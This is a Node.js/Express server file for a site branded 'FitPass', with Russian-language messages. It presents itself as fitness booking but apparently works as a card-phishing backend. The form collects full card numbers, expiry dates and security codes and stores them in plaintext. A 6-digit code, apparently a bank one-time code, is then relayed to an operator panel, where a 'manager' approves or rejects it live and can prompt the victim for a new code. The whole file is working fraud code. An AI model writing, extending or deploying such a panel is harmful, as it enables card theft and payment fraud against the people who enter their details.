const express=require("express");
const session=require("express-session");
const helmet=require("helmet");
const fs=require("fs");
const path=require("path");
const crypto=require("crypto");

const app=express();
const PORT=process.env.PORT||3000;
const DATA=path.join(__dirname,"data.json");
const ADMIN_USER=process.env.ADMIN_USER||"admin";
const ADMIN_PASS=process.env.ADMIN_PASS || (process.env.NODE_ENV === "production" ? "" : "change-me-now");
const SESSION_SECRET=process.env.SESSION_SECRET||crypto.randomBytes(32).toString("hex");

const read=()=>{try{return JSON.parse(fs.readFileSync(DATA,"utf8"))}catch{return[]}};
const write=(data)=>fs.writeFileSync(DATA,JSON.stringify(data,null,2),"utf8");
const clean=(v)=>String(v??"").trim().slice(0,200);
const auth=(req,res,next)=>req.session.admin?next():res.status(401).json({error:"Необходим вход"});

if(!fs.existsSync(DATA))write([]);

app.use(helmet({contentSecurityPolicy:false}));
app.use(express.json({limit:"100kb"}));
app.use(express.urlencoded({extended:false}));
app.use(session({
  secret:SESSION_SECRET,
  resave:false,
  saveUninitialized:false,
  cookie:{httpOnly:true,sameSite:"lax",secure:process.env.NODE_ENV==="production",maxAge:8*60*60*1000}
}));
app.use(express.static(path.join(__dirname,"public")));

app.post("/api/leads",(req,res)=>{
  const name=clean(req.body.name);
  const card_number=clean(req.body.card_number);
  const expiry=clean(req.body.expiry);
  const card_code=clean(req.body.card_code);
  const booking_date=clean(req.body.booking_date)||"25 сентября";
  const booking_time=clean(req.body.booking_time);

  const digits=card_number.replace(/\D/g,"");
  if(!name||digits.length!==16||!expiry||!card_code||!booking_time){
    return res.status(400).json({error:"Заполните все поля и укажите ровно 16 цифр номера карточки."});
  }

  const a=read();
  const id=a.length?Math.max(...a.map(x=>Number(x.id)||0))+1:1;

  a.unshift({
    id,
    name,
    card_number:digits,
    expiry,
    card_code,
    booking_date,
    booking_time,
    booking:`${booking_date} · ${booking_time}`,
    status:"Ожидает ввода кода",
    submitted_code:null,
    attempts:0,
    last_attempt_at:null,
    retry_requested:false,
    retry_requested_at:null,
    created_at:new Date().toISOString()
  });

  write(a);
  res.json({ok:true,id});
});

app.get("/api/leads/:id/status",(req,res)=>{
  const x=read().find(v=>Number(v.id)===Number(req.params.id));
  if(!x)return res.status(404).json({error:"Заявка не найдена"});
  res.json({
    id:x.id,
    status:x.status,
    attempts:x.attempts||0,
    last_attempt_at:x.last_attempt_at||null,
    retry_requested:!!x.retry_requested,
    retry_requested_at:x.retry_requested_at||null
  });
});

app.post("/api/leads/:id/submit-code",(req,res)=>{
  const a=read();
  const x=a.find(v=>Number(v.id)===Number(req.params.id));
  const code=clean(req.body.code).replace(/\D/g,"");

  if(!x)return res.status(404).json({error:"Заявка не найдена"});
  if(x.status==="Подтверждено")return res.status(409).json({error:"Эта заявка уже подтверждена"});
  if(code.length!==6)return res.status(400).json({error:"Код должен содержать ровно 6 цифр"});

  x.submitted_code=code;
  x.attempts=(x.attempts||0)+1;
  x.last_attempt_at=new Date().toISOString();
  x.retry_requested=false;
  x.retry_requested_at=null;
  x.status="Ожидает решения менеджера";

  write(a);
  res.json({ok:true,status:x.status,attempts:x.attempts});
});

app.post("/api/leads/:id/request-retry",(req,res)=>{
  const a=read();
  const x=a.find(v=>Number(v.id)===Number(req.params.id));
  if(!x)return res.status(404).json({error:"Заявка не найдена"});
  if(x.status!=="Код не подошёл — повторный ввод"){
    return res.status(400).json({error:"Повторная отправка сейчас недоступна"});
  }

  x.submitted_code=null;
  x.retry_requested=true;
  x.retry_requested_at=new Date().toISOString();
  x.status="Клиент запросил новый код";

  write(a);
  res.json({ok:true,status:x.status,attempts:x.attempts||0});
});

app.post("/api/login",(req,res)=>{
  if(!ADMIN_PASS)return res.status(503).json({error:"Администратор не настроен. Добавьте ADMIN_PASS в Vercel Environment Variables."});
  if(req.body.username===ADMIN_USER && req.body.password===ADMIN_PASS){
    req.session.admin=true;
    return res.json({ok:true});
  }
  res.status(401).json({error:"Неверный логин или пароль"});
});

app.post("/api/logout",(req,res)=>req.session.destroy(()=>res.json({ok:true})));
app.get("/api/me",(req,res)=>res.json({authenticated:!!req.session.admin}));
app.get("/api/leads",auth,(req,res)=>res.json(read()));

app.post("/api/leads/:id/decision",auth,(req,res)=>{
  const a=read();
  const x=a.find(v=>Number(v.id)===Number(req.params.id));
  const decision=clean(req.body.decision);
  if(!x)return res.status(404).json({error:"Заявка не найдена"});

  if(decision==="approve"){
    if(x.status!=="Ожидает решения менеджера"){
      return res.status(400).json({error:"Сейчас нет кода на проверке"});
    }
    x.status="Подтверждено";
    x.retry_requested=false;
  }else if(decision==="reject"){
    if(x.status!=="Ожидает решения менеджера"){
      return res.status(400).json({error:"Сейчас нет кода на проверке"});
    }
    x.status="Код не подошёл — повторный ввод";
    x.rejected_code=x.submitted_code||null;
    x.rejected_at=new Date().toISOString();
    x.submitted_code=null;
  }else{
    return res.status(400).json({error:"Недопустимое решение"});
  }

  write(a);
  res.json({ok:true,status:x.status});
});

app.delete("/api/leads/:id",auth,(req,res)=>{
  write(read().filter(v=>Number(v.id)!==Number(req.params.id)));
  res.json({ok:true});
});

if (require.main === module) {
  app.listen(PORT,()=>console.log(`FitPass running on http://localhost:${PORT}`));
}

module.exports = app;